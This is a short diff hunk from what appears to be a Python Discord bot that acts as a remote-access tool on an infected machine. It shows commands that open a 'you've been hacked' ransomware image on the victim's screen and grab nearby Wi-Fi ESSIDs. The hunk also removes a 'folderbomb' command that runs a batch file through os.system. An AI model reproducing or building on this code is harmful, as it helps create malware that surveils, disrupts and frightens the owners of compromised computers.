@@ -44,10 +44,7 @@ async def cmd(ctx):
 @bot.command()
 async def haxed(ctx):
 	webbrowser.open("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsensorstechforum.com%2Fwp-content%2Fuploads%2F2017%2F10%2Fstf-magic-ransomware-virus-background-image-youve-been-hacked.png&f=1&nofb=1")
-@bot.command()
-async def folderbomb(ctx):
-        await ctx.send("[*] Command sent")
-	os.system("component.bat")
+
 @bot.command()
 async def grabessid(ctx):
         await ctx.send("Grabbing ESSIDs..")
